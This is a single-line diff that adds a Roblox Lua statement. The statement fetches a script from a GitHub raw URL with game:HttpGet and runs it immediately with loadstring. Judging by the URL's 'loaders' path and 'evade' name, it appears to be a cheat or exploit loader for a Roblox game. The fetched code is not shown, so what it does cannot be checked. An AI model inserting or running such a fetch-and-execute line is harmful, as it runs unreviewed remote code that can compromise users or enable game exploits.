@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/hlwn-evade-s2-lbp7x2bfdjcekv.lua"))()
